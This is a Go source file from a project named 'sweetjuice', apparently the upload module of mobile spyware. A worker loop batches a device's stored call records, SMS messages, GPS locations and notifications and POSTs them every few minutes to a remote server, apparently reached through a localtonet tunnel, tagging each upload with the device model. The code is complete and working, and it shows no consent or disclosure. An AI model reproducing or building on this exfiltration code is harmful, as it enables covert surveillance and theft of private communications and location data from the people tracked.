package tasks

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"time"

	"sweetjuice/lib/store"
)

// SenderWorker reads unsent items from the store and uploads them by type.
func SenderWorker() error {
	InitStore()
	s := store.Get()

	var totalCalls, totalSms, totalGps, totalNotifs int

	err := RunLoop(LoopConfig{
		Duration:      8 * time.Minute,
		SleepInterval: 2 * time.Minute,
	}, func(iteration int) error {
		items, err := s.Unsent()
		if err != nil {
			return fmt.Errorf("read unsent: %w", err)
		}
		if len(items) == 0 {
			return nil
		}

		var calls, sms, gps, notifs []string
		for _, it := range items {
			switch it.Type {
			case store.EventTypeCall:
				calls = append(calls, it.ID)
			case store.EventTypeSMS:
				sms = append(sms, it.ID)
			case store.EventTypeGPS:
				gps = append(gps, it.ID)
			case store.EventTypeNotif:
				notifs = append(notifs, it.ID)
			}
		}

		if len(calls) > 0 {
			if err := Upload("calls", calls, s); err != nil {
				fmt.Printf("sender: calls error: %v\n", err)
			} else {
				totalCalls += len(calls)
			}
		}
		if len(sms) > 0 {
			if err := Upload("sms", sms, s); err != nil {
				fmt.Printf("sender: sms error: %v\n", err)
			} else {
				totalSms += len(sms)
			}
		}
		if len(gps) > 0 {
			if err := Upload("gps", gps, s); err != nil {
				fmt.Printf("sender: gps error: %v\n", err)
			} else {
				totalGps += len(gps)
			}
		}
		if len(notifs) > 0 {
			if err := Upload("notifs", notifs, s); err != nil {
				fmt.Printf("sender: notifs error: %v\n", err)
			} else {
				totalNotifs += len(notifs)
			}
		}

		fmt.Printf("sender: iteration %d sent calls=%d sms=%d gps=%d notifs=%d\n",
			iteration, len(calls), len(sms), len(gps), len(notifs))
		return nil
	})

	fmt.Printf("sender: total sent calls=%d sms=%d gps=%d notifs=%d\n",
		totalCalls, totalSms, totalGps, totalNotifs)
	return err
}

// Upload sends a batch of store item IDs to the backend for the given path.
func Upload(path string, ids []string, s *store.Store) error {
	items, err := s.Unsent()
	if err != nil {
		return fmt.Errorf("read unsent: %w", err)
	}

	var batch []map[string]interface{}
	var target []string
	for _, it := range items {
		for _, id := range ids {
			if it.ID == id {
				batch = append(batch, it.Payload)
				target = append(target, id)
				break
			}
		}
	}
	if len(batch) == 0 {
		fmt.Printf("sender: %s batch empty after filter\n", path)
		return nil
	}

	payload, err := json.Marshal(batch)
	if err != nil {
		return fmt.Errorf("marshal: %w", err)
	}

	req, err := http.NewRequest("POST", serverURL+"/receive_data/"+path, bytes.NewReader(payload))
	if err != nil {
		return fmt.Errorf("request create: %w", err)
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("localtonet-skip-warning", "1")
	req.Header.Set("C-Device", deviceModel)

	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("http do: %w", err)
	}
	defer resp.Body.Close()

	fmt.Printf("sender: %s status=%d body=%s\n", path, resp.StatusCode, resp.Status)

	if resp.StatusCode >= 400 {
		return fmt.Errorf("server returned %d for %s", resp.StatusCode, path)
	}

	s.MarkSent(target...)
	fmt.Printf("sender: %s marked %d as sent\n", path, len(target))
	return nil
}
